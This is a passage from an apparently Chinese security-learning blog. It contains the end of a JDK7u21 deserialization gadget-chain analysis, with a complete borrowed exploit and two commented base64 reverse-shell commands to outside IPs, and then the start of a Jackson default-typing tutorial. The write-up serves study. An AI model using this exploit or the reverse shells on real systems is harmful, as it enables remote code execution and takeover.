<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Map.Entry var3;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">            var3 = (Map.Entry)var2.next();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>遍历 memberValues 这个Map中的每个key和value，计算每个 (127 * key.hashCode()) ^ value.hashCode() 并求和。 </p>
<p>JDK7u21中使用了一个非常巧妙的方法：</p>
<ul>
<li>当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 *key.hashCode()) ^ value.hashCode() </li>
<li>当 key.hashCode() 等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成 value.hashCode() 。 </li>
<li>当 value 就是TemplateImpl对象时，这两个哈希就变成完全相等</li>
</ul>
</blockquote>
<p>所以我们需要找到一个hash值为0的key，将恶意的Templates放入value中，这样计算key的hash为0后，就会将value的hash返回回去，就会和原来的hash相等</p>
<p>这里别人爆破到hashCode值为0的，是 <code>f5a5a608</code></p>
<p>所以我们需要put时，调用<code>map.put(&#39;f5a5a608&#39;,templates)</code>，这样的化，在计算Proxy的hash值时，即为计算<code>templates</code>的hash值（有点感觉像ctf里面php反序列化中的，地址赋值法（自己起的名字））</p>
<h3 id="PI7Ee">小结</h3>
现在的链构造流程就非常的清晰明了了

<p>首先生成恶意TemplateImpl 对象</p>
<p>实例化AnnotationInvocationHandler 对象</p>
<ul>
<li>它的type属性是一个TemplateImpl类</li>
<li>它的memberValues属性是一个Map，Map只有一个key和value，key是字符串f5a5a608 ， value是前面生成的恶意TemplateImpl对象</li>
</ul>
<p>对这个AnnotationInvocationHandler 对象做一层代理，生成proxy对象</p>
<p>实例化一个HashSet，这个HashSet有两个元素，分别是：</p>
<ul>
<li>TemplateImpl对象</li>
<li>proxy对象</li>
</ul>
<p>将HashSet对象进行序列化</p>
<h2 id="jK1F3">EXP编写（不是很会，拿来主义）</h2>
从别的师傅那里拿来的EXP如下（不是很会，拿来主义）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdk</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Drunkbaby&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">// new String[]&#123;\&quot;/bin/bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMC4xNjQvMTIzNiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;&quot;</span></span><br><span class="line">        <span class="type">byte</span>[] evil = getTemplatesImpl(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilHashCode</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        <span class="comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(evilHashCode,<span class="string">&quot;sean&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面部分搞动态代理，反射获取 AnnotationInvocationHandler 类，再实例化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">handler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Templates.class, hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(jdk.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备入口类 LinkedHashSet</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        hashMap.put(evilHashCode, templates);</span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        deserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="comment">// &quot;new String[]&#123;\&quot;/bin/bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;&quot;</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有些地方暂时不是很会，别的师傅EXP中所写的 <strong>创建类 并读取字节</strong> 的方法，后续会补起来的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741860627083-9dd9757f-e65a-4d1f-b407-2383a59d59c1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741860627083-9dd9757f-e65a-4d1f-b407-2383a59d59c1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="xWsrF">断点调试</h2>

<p>我们在<code>HashSet</code>的<code>readObject</code>方法中下一个断点</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591056600-02e0d8fd-efc9-415e-bba0-1e5bc994df8e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591056600-02e0d8fd-efc9-415e-bba0-1e5bc994df8e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>第一次进入<code>HashMap#put</code>方法，其中table值为空，我们就无法遍历，只能向下走入<code>addEntry</code>方法，经过该方法后，table中不为空</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591115248-88ba40d4-9d0d-4bb0-a873-1ffe007ae9fd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591115248-88ba40d4-9d0d-4bb0-a873-1ffe007ae9fd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>第二次进入<code>put</code>方法后，由于我们构造的MagicNumber，现在能够成功走到<code>key.equals</code>方法处</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591332646-9d600536-cd71-4afd-8f72-e1b254827d18.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591332646-9d600536-cd71-4afd-8f72-e1b254827d18.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>由于key为一个<code>Proxy</code>类，因此在调用key的<code>equals</code>方法时，我们发现就会进入到<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法中</p>
<p>这里由于调用方法为<code>equals</code>，且参数只有一个，所以能够进入到if代码块中，调用<code>equalsImpl</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591404870-7cdb8333-0f7b-4071-98b5-16c7d8a159e6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591404870-7cdb8333-0f7b-4071-98b5-16c7d8a159e6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入<code>equalsImpl</code>内，第一次循环时，我们就看到<code>methodName</code>为<code>newTransformer</code>方法，这里通过反射调用该方法，就触发我们后续的攻击链</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591635131-49481cd4-6c62-49cd-99c7-4fe27914d589.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591635131-49481cd4-6c62-49cd-99c7-4fe27914d589.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续的分析之前有说过，所以这里不再过多赘述</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591751189-c6a5362a-2a94-425e-a2b2-7906d2dce61a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591751189-c6a5362a-2a94-425e-a2b2-7906d2dce61a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="LX8gx">小结</h2>

<p>感觉很神奇的一条链子，看起来有种CTF的感觉</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JDK原生反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson反序列化</title>
    <url>/2025/08/26/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="qE4jT">Jackson反序列化</h1>
<h2 id="w9wXP">Jackson基础</h2>
<h3 id="SYYMC">Jackson介绍</h3>
Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。

<p>本次Jackson反序列化使用Jackson版本为2.7.9，导入依赖如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="JiRw8">Jackson序列化及反序列化</h3>

<p>首先我们自定义一个Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编写一个Jackson的序列化与反序列化的Demo。使用<code>writeValueAsString</code>方法可以将一个对象序列化为Json字符串，而使用<code>readValue</code>方法可以将一个字符串反序列化为一个Java对象，漏洞的触发点就在<code>readValue</code>处</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.age = <span class="number">18</span>;</span><br><span class="line">        person.name = <span class="string">&quot;CurlySean&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person类序列化后的json字符串如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755793239553-034c0dbe-df45-4e27-a175-3b3e8043af83.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755793239553-034c0dbe-df45-4e27-a175-3b3e8043af83.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="UAc6W">Jackson对于多态问题的解决</h3>

<p>将一个多态类的某一个子类序列化后，再进行反序列化时，该怎么确保反序列化出的实例，是我们想要的那个实例呢？Jackson使用JacksonPolymorphicDeserialization机制来解决这个问题：</p>
<p>JacksonPolymorphicDeserialization即Jackson多态类的反序列化。在反序列化的过程中，如果类的成员变量不是举例类型，例如Object、Interface（接口）或Abstrack（抽象类），则可以在Json字符串中指定其具体类型，Jackson将生成具体类型的实例。即可以将具体子类的信息绑定在序列化的内容中，在后续的反序列化过程中，可以直接得到目标子类对象，其中有两种实现方式：</p>
<ul>
<li>DefaultTyping</li>
<li>@JsonTypeInfo</li>
</ul>
<h4 id="ThNPa">DefaultTping</h4>

<p>在Jackson中提供了enableDefaultTyping设置，其中包含了四个值：</p>
<ol>
<li>JAVA_LANG_OBJECT</li>
<li>OBJECT_AND_NON_CONCRETE</li>
<li>NON_CONCRETE_AND_ARRAYS</li>
<li>NON_FINAL</li>
</ol>
<p>在设置<code>enableDefalutTyping</code>时，默认<code>OBJECT_AND_NON_CONCRETE</code></p>
<h5 id="OCeC9">JAVA_LANG_OBJECT</h5>

<p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名</p>
<p>我们添加一个Hacker类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在Person类中，添加一个Object类型的属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object hacker;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新建一个<code>JAVA_LANG_OBJECTdemo.java</code>，添加<code>enableDefaultTyping()</code>，将其设置为JAVA_LANG_OBJECT</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVA_LANG_OBJECTdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.age = <span class="number">20</span>;</span><br><span class="line">        person.name = <span class="string">&quot;CurlySean&quot;</span>;</span><br><span class="line">        person.hacker = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> objectMapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行后输出序列化json字符串如下。我们和未设置<code>JAVA_LANG_OBJECT</code>情况下的序列化字符串做一下对比，发现在设置<code>JAVA_LANG_OBJECT</code>时，Object类型的属性格式为<code>key:[&quot;全类名&quot;,&#123;&quot;key&quot;:&quot;value&quot;&#125;]</code>（有点像fastjson中的<code>@Type</code>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置JAVA_LANG_OBJECT</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;]&#125;</span><br><span class="line"><span class="comment">//未设置JAVA_LANG_OBJECT</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795014541-d4524649-eb82-4715-bd61-680962338c6e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795014541-d4524649-eb82-4715-bd61-680962338c6e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="MqB0j">OBJECT_AND_NON_CONCRETE</h5>

<p>OBJECT_AND_NON_CONCRETE：除了<code>JAVA_LANG_OBJECT</code>的特征，在类中有Interface和Abstract时，也会将其序列化和反序列化（一切的前提是这些类本身就是合法的可序列化的对象）</p>
<p>我们添加一个Sex接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sex</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加一个Sex接口的实现类<code>MySex</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span>&#123;</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再Person类中添加sex属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object hacker;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改序列化和反序列化代码</p>
